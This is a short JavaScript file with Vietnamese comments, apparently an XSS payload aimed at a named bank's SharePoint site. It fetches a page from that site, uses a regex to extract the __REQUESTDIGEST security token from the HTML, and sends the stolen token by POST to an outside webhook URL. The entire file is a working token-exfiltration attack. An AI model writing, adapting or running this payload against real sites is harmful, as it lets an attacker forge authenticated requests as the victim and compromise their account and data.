const DIGEST_API_URL = 'https://sacombankvn.sharepoint.com/sites/QunldnGBM/_layouts/15/CSPReporting.aspx?scenario=modern'; // API GET thường có tham số
// Thay thế bằng URL Webhook của bạn
const WEBHOOK_URL = 'https://webhook-test.com/fc090c2a4b9b8347c2761f9e3944e4bc'; 

function sendToWebhook(digestValue) {
    const webhookReq = new XMLHttpRequest();
    
    // Tạo body JSON để gửi dữ liệu đi qua POST
    const payload = JSON.stringify({
        'captured_digest': digestValue
    });

    // Yêu cầu POST đến Webhook
    webhookReq.open('post', WEBHOOK_URL, true); 
    webhookReq.setRequestHeader('Content-Type', 'application/json'); 
    webhookReq.send(payload); 
}

function handleResponse() {
    let digestValue = null;
    
    try {
        // Regex để tìm và trích xuất giá trị từ thuộc tính "value" của thẻ input
        // Nó tìm kiếm token trong nhóm bắt giữ thứ 1: [^"']+
        const regex = /id=["']__REQUESTDIGEST["'][^>]*?value=["']([^"']+)["']/i;
        const match = this.responseText.match(regex);
        
        if (match && match[1]) {
            // Lấy chính xác chuỗi token từ nhóm bắt giữ (match[1])
            digestValue = match[1];
        }

    } catch (e) {
        return; 
    }
    
    if (digestValue) {
        // Gửi token đã trích xuất tới Webhook
        sendToWebhook(digestValue);
    }
}

// Bắt đầu quá trình: Gửi request POST đầu tiên để lấy HTML Response
const digestReq = new XMLHttpRequest();
digestReq.onload = handleResponse;

// Yêu cầu POST đến API Digest
digestReq.open('post', DIGEST_API_URL, true); 
digestReq.send();
